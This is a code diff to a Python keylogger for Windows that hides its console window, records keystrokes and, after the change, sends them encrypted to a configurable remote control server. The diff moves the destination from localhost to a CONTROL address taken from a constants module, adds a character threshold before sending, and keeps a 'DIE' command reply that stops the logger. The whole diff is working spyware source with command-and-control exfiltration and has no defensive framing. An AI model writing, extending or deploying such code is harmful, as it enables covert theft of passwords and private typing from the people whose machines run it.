@@ -10,6 +10,7 @@ import win32gui            # for getting window titles and hiding the console wi
 import ctypes              # for getting window titles, current keyboard layout and capslock state
 import datetime            # for getting the current time and using timedelta
 import threading
+import constants
 
 # CONSTANTS
 # this number of characters must be typed for the logger to write the line_buffer:
@@ -28,6 +29,7 @@ count, backspace_buffer_len = 0, 0
 
 exit_event = threading.Event()
 ADDRESS = ""
+CONTROL = constants.CONTROL
 
 # Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
 lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
@@ -158,15 +160,15 @@ def update_upper_case():
 
 upper_case = update_upper_case()
 
-
 def log_it():
-    global line_buffer, backspace_buffer_len
+    global line_buffer, backspace_buffer_len, CONTROL
     try:
-        t = encrypt(f"{ADDRESS}\nkm84\n{line_buffer}")
-        response = requests.post("http://127.0.0.1:8000", data=t)
+        if len(line_buffer) < CHAR_LIMIT: return
+        t = encrypt(f"km84\n{ADDRESS}\n{line_buffer}")
+        response = requests.post(CONTROL, data=t)
         line_buffer, backspace_buffer_len = '', 0
         if "DIE" in response.text:
-            requests.post("http://127.0.0.1:8000", data=encrypt("Killing keylogger"))
+            requests.post(CONTROL, data=encrypt("Killing keylogger - from keylogger"))
             exit_event.set()
     except:
         pass
